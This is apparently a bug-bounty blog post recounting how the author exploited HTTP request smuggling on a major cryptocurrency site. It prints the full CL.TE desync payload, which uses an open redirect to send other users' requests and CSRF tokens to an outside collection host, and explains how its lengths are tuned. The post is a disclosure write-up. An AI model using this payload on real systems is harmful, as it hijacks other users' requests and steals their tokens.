# :locked_with_key: Request Smuggling In Major Crypto Site — road to disappointment

---

# Request Smuggling In Major Crypto Site — road to disappointment

Let me introduce myself since this is my first writing ever. At the beginning sorry if I make mistakes in my writing since English is not my native language. I come from a small country, working in IT since 1998 and “monitoring” security scene since then. I never had the courage to proclaim myself as a security expert since coding was my bad side(i thought it was boring sitting on a chair typing code the whole day long) but I was admired back then by some teams and experts(fluffy bunny, team teso, some IRC channels and so on…)My first ever bug I exploited was I think the Unicode bug in windows servers, lot of XSS on yahoo and google sites, I even managed to write buffer overflow exploit for Winamp in my learning paths. It was much different back then. My road pushed me away from the security scene for a while but I never stopped.

Back to reality a while ago a joined the Hackerone platform just to practice my skills. Found some XXE, XSS, Open redirects, CRLF, even embedded Token on Twitter sites which gave me a nice bounty(thank you Twitter). Since it was not a big challenge for me I wanted to try something else.

Then there was this great presentation by James Kettle (albinowax) about HTTP Request Smuggling. I started reading about desync attacks([https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)), watched some videos, took some practice test at portswigger academy, and felt prepared to try my luck with my next host :)

Meanwhile, I got an invitation from this major crypto site and started enumerating subdomains, found some open redirects and user enumeration but all of them were out of scope. Decided to try a test script by [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler) and in a matter of short time I’ve got some vulnerable hosts.

Great, but now comes the hard part of crafting the payload. Many sleepless nights trying everything without success. A lot of times I forgot to uncheck update content-length in a burp or convert decimal to hexadecimal as the length of smuggled request or ending requests like 0\r\n\r\n

## Get CeloIme Prezime’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Finally, I got hit at my beeceptor endpoint and I could not believe my eyes, tokens were started raining. The payload was as follow:

>

POST /?cb=7309697047596003 HTTP/1.1
Transfer-Encoding: chunked
Host: XXXXXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 4
Cookie: 5d2af5477d02a9df5f62511ceebb7972d3bae8d63fc14bc2223e14bfffba0d4f7c96c6cf46c3de33b3;F4\r\n (→count character of request below and convert them in hex)
GET /xxxx?a=2&targeturl=//oxygenne.free.beeceptor.com HTTP/1.1
Host: XXXXXX
Connection: close
Content-Length: 50
AccountType: Real
Authorization: Hidden
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, /x=1
0\r\n\r\n

In this request, the front end accepts “Transfer-Encoding: chunked” and will process the first chunk F4 or 244 in decimal.When it comes to 0\r\n\r\n it forward requests to the backend which accepts only Content-Length. Backend sees request body only of 4( Content-Length: 4 where F4\r\n = 4) and process it, appending the rest of it or GET /xxxx?a=2&targeturl=//oxygenne.free.beeceptor.com HTTP/1.1
Host: XXXXXX(this was an actual open redirect URL I found before and it was out of scope)to the next request which is random user one. Users were redirected to an endpoint with embedded x-csrf-token.

Immediately I reported to the program owner and after a lot of explanations, it was triaged. Unfortunately, I got zero bounties since you needed to submit at least one P1 before entering their bounty level. The disappointment was huge but as I wrote before I did not stop there.

---
